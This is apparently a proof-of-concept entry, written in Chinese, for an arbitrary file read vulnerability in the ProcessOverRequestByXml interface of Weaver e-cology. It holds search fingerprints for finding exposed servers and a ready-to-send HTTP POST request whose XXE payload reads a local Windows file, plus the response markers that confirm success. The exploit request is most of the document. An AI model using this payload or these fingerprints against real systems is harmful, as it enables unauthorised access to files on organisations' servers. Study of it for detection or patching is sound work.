﻿# 泛微e-cology ProcessOverRequestByXml接口 任意文件读取漏洞

> 更新时间：2024-04-13

> 漏洞编号：

> 漏洞说明：泛微e-cology依托全新的设计理念,全新的管理思想。 为中大型组织创建全新的高效协同办公环境。 智能语音办公,简化软件操作界面。 身份认证、电子签名、电子签章、数据存证让合同全程数字化。泛微e-cology ProcessOverRequestByXml接口存在任意文件读取漏洞

> 漏洞特征：body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver" && body="ecology") || (header="ecology_JSessionId" && body="login/Login.jsp") || body="/wui/index.html" || body="jquery_wev8" && body="/login/Login.jsp?logintype=1"

> 验证脚本：HTTP

```
POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：泛微e-cology ProcessOverRequestByXml接口 任意文件读取漏洞.poc

